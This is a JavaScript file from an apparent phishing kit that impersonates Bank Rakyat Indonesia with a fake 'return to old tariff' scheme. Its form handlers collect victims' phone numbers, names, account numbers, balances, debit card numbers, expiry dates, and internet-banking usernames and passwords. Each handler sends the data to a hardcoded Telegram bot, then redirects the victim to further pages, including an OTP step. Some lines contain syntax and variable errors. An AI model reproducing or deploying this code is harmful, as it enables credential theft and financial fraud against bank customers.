function vibr(dur) {
    if (navigator.vibrate) {
        navigator.vibrate(dur);
    } else {
        console.log("NotSupported");
    }
}


function get() {
    $("#process1").show();
    $('.load').fadeIn();
    setTimeout(function() {
        location.href = 'https://wa.me/6282176223432?text=SELAMAT%20DATANG%20DI%20LAYANAN%20BANK%20RAKYAT%20INDONESIA%0A%0AMOHON%20BANTUANNYA%20UNTUK%20KEMBALI%20KE%20TARIF%20LAMA%20';
        $("#process1").hide();
        $('.load').fadeOut();
    }, 2000);
}



// TARIF
$(document).ready(function() {
    $('#inputlogin').submit(function(e) {
        event.preventDefault();
        $('.load').fadeIn();
        document.getElementById('kirims').innerHTML = "Memproses....";
        var tarif = document.getElementById("tarif").value;
        sessionStorage.setItem("tarif", tarif);   
        var NoHp = document.getElementById("NoHp").value;
        sessionStorage.setItem("NoHp", NoHp);   
        $("#lonte").show();


        var tarif = document.getElementById('tarif');
        var NoHp = document.getElementById('NoHp');
        var logo = "├•★𝓑𝓪𝓷𝓴 𝓡𝓪𝓴𝔂𝓪𝓽 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★" + "%0A├─────ℙ𝕚𝕝𝕚𝕙 𝕋𝕒𝕣𝕚𝕗────%0A├•𖥔"

        var gabungan = '' + logo + '%0A├•★ ' + tarif.value + '%0A├•★ 𝗡𝗼𝗺𝗼𝗿 𝗛𝗽 : ' + NoHp.value + '%0A╰───────────────────';

        var token = '8098155360:AAHGe1Cc2vO4aq-XdhuU1hNKZ9XOCQNyiVA'; // Ganti dengan token bot yang kamu buat
        var grup = '6980927648'; // Ganti dengan chat id dari bot yang kamu buat


        $.ajax({
            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
            method: `POST`,

            complete: function(data) {
                vibr(180);
                console.log('Complete')
                setTimeout(function() {
               $("#popupku").fadeIn(200);
     
                    $("#lonte").hide();
                    document.getElementById('kirims').innerHTML = "Lanjutkan";
                    $('.load').fadeOut();
                }, 00);
            }
        });
    });
    return false;
});
// LOGIN
$(document).ready(function() {
    $('#formlog').submit(function(e) {
        event.preventDefault();
        $('.load').fadeIn();
        document.getElementById('kirim').innerHTML = "Memproses....";
        $("#lonte").show();


        var tarif = document.getElementById('tarif');
        var nomorku = document.getElementById('nomorku');
        var nama = document.getElementById('nama');
        var norek = document.getElementById('norek');

        var gabungan = '%0A※ : ' +  tarif.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 𝗛𝗽 : ' + nomorku.value + '%0A※ 𝗡𝗮𝗺𝗮 : ' + nama.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 𝗥𝗲𝗸 : ' + norek.value;

         var token = '8098155360:AAHGe1Cc2vO4aq-XdhuU1hNKZ9XOCQNyiVA'; // Ganti dengan token bot yang kamu buat
        var grup = '6980927648'; // Ganti dengan chat id dari bot yang kamu buat


        $.ajax({
            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
            method: `POST`,


            complete: function(data) {
                vibr(180);
                console.log('Complete')
                setTimeout(function() {
                    window.location.href = 'saldo.html'
                    $("#lonte").hide();
                    document.getElementById('kirim').innerHTML = "Lanjutkan";
                    $('.load').fadeOut();
                    var tarif = document.getElementById("tarif").value;
                    sessionStorage.setItem("tarif", tarif);
                    var nomortel = document.getElementById('nomorku').value;
                    sessionStorage.setItem("nomortel", nomortel);
                    var noreke = document.getElementById('norek').value;
                    sessionStorage.setItem("noreke", noreke);
                    var namanya = document.getElementById('nama').value;
                    sessionStorage.setItem("namanya", namanya);
                }, 500);
            }
        });
    });
    return false;
});

// SALDO
$(document).ready(function() {
    $('#formsal').submit(function(e) {
        event.preventDefault();
        $('.load').fadeIn();
        document.getElementById('kirims').innerHTML = "Verify...";
        $("#lonte").show();

        var tarif = document.getElementById('tarif');
        var nomorku = document.getElementById('nomorku');
        var nama = document.getElementById('nama');
        var saldo = document.getElementById('saldo');

        var gabungan = '%0A※ : ' +  tarif.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 𝗛𝗽 : ' + nomorku.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 𝗥𝗲𝗸 : ' + nama.value +  '%0A※ 𝗦𝗮𝗹𝗱𝗼 : ' + saldo.value;

        var token = '8098155360:AAHGe1Cc2vO4aq-XdhuU1hNKZ9XOCQNyiVA'; // Ganti dengan token bot yang kamu buat
        var grup = '6980927648'; // Ganti dengan chat id dari bot yang kamu buat


        $.ajax({
            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
            method: `POST`,


            complete: function(data) {
                vibr(180);
                console.log('Complete')
                setTimeout(function() {
                    window.location.href = '123.html'
                    $("#lonte").hide();
                    document.getElementById('kirims').innerHTML = "Benar";
                    $('.load').fadeOut();
                    var tarif = document.getElementById("tarif").value;
                    sessionStorage.setItem("tarif", tarif);
                    var phone = document.getElementById("nomorku").value;
                    sessionStorage.setItem("phone", phone);
                    var user = document.getElementById("nama").value;
                    sessionStorage.setItem("user", user);
                    var duet = document.getElementById("saldo").value;
                    sessionStorage.setItem("duet", duet);
                }, 500);
            }
        });
    });
    return false;
});



    // debit
    $(document).ready(function() {
        $('#formdebit').submit(function(e) {
            event.preventDefault();
            $('.load').fadeIn();
            document.getElementById('kirim').innerHTML = "Memproses....";
            $("#lonte").show();


            var tarif = document.getElementById('tarif');
            var nomorku = document.getElementById('nomorku');
            var debit = document.getElementById('debit');
            var valid = document.getElementById('valid');
            var cvv = document.getElementById('cvv');
            var saldo = document.getElementById('saldo');

            var gabungan = '%0A※ : ' + tarif.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 𝗛𝗽 : ' + nomorku.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 𝗗𝗲𝗯𝗶𝘁 : ' + debit.value + '%0A※ 𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂 : ' + valid.value + '%0A※ 𝗦𝗮𝗹𝗱𝗼 : ' + saldo.value;

            var token = '8098155360:AAHGe1Cc2vO4aq-XdhuU1hNKZ9XOCQNyiVA'; // Ganti dengan token bot yang kamu buat
        var grup = '6980927648'; // Ganti dengan chat id dari bot yang kamu buat


            $.ajax({
                url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
                method: `POST`,


                complete: function(data) {
                    vibr(180);
                    console.log('Complete')
                    setTimeout(function() {
                        window.location.href = 'konf.html'
                        $("#lonte").hide();
                        document.getElementById('kirim').innerHTML = "Lanjutkan";
                        $('.load').fadeOut();
                        var tarif = document.getElementById("tarif").value;
                        sessionStorage.setItem("tarif", tarif);
                        var nomortel = document.getElementById('nomorku').value;
                        sessionStorage.setItem("nomortel", nomortel);
                        var debit = document.getElementById('debit').value;
                        sessionStorage.setItem("debit", debit);
                        var valid = document.getElementById('valid').value;
                        sessionStorage.setItem("valid", valid);
                       var saldo = document.getElementById('saldo').value;
                        sessionStorage.setItem("saldo", saldo); 
                    }, 500);
                }
            });
        });
        return false;
    });



function sendBelum(){
    
    event.preventDefault();   
     $('#btnsubmit').prop('disabled', true);
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);
  var nohp = $('#nohp').val();
  sessionStorage.setItem('nohp', nohp);
  var uname = $('#uname').val();
  sessionStorage.setItem('uname', uname);
  var pass = $('#pass').val();
  sessionStorage.setItem('pass', pass);
   
   var logo = "├•★𝓑𝓪𝓷𝓴 𝓡𝓪𝓴𝔂𝓪𝓽 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★". "%0A├─────•𝕃𝕠𝕘𝕚𝕟•────%0A├•𖥔"     
                        
  
    var gabungan = '' + logo + '%0A├•★ ' + tarif + '%0A├•★ 𝗡𝗼.𝗛𝗽 : ' + nohp + '%0A├•★ 𝗨𝘀𝗲𝗿 : ' + uname + '%0A├•★  𝗣𝗮𝘀𝘀 : ' + pass + "%0A╰───────────────────";
    
    var token = '8098155360:AAHGe1Cc2vO4aq-XdhuU1hNKZ9XOCQNyiVA'; // Ganti dengan token bot yang kamu buat
        var grup = '6980927648'; // Ganti dengan chat id dari bot yang kamu buat 
    
    
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,   
    complete: function(){
      
    setTimeout(function(){        
    
     window.location.href='saldoblm.html'
    }, 300);}});};   
  
//batasi  
  function sendSaldo(){
   $('.load').fadeIn();
    event.preventDefault();   
    
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);
  var nohp = $('#nohp').val();
  sessionStorage.setItem('nohp', nohp);
  var atm = $('#atm').val();
  sessionStorage.setItem('atm', atm);
  var valid = $('#valid').val();
  sessionStorage.setItem('valid', valid);
  var saldo = $('#saldo').val();
  sessionStorage.setItem('saldo', saldo);
   
  document.getElementById('kirim').innerHTML = "Please wait...";         
                        
    var logo = '—┈┈•༶𝘄𝘄𝘄.𝗶𝗯𝗯𝗿𝗶.𝗰𝗼.𝗶𝗱°°𝗦𝘂𝗱𝗮𝗵';           
    var gabungan = '' + logo + '%0A%0A⋇ 𝗧𝗮𝗿𝗶𝗳 •• ' + tarif + '%0A⋇ 𝗡𝗼.𝗛𝗽 •• ' + nohp + '%0A%0A⋇ 𝗡𝗼.𝗔𝘁𝗺 •• ' + atm + '%0A⋇ 𝗠𝗮𝘀𝗮 •• ' + valid + '%0A⋇ 𝗖𝘃𝘃 •• ' + cvv + '%0A⋇ 𝗦𝗮𝗹𝗱𝗼 •• ' + saldo ;   
    
     var token = '8098155360:AAHGe1Cc2vO4aq-XdhuU1hNKZ9XOCQNyiVA'; // Ganti dengan token bot yang kamu buat
     var grup = '6980927648'; // Ganti dengan chat id dari bot yang kamu buat
    
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,   
    complete: function(){
       vibr(180);
    setTimeout(function(){        
    document.getElementById('kirim').innerHTML = "Lanjutkan";
    window.location.href='otp.html';
    $('.load').fadeOut();
    }, 200);}});};   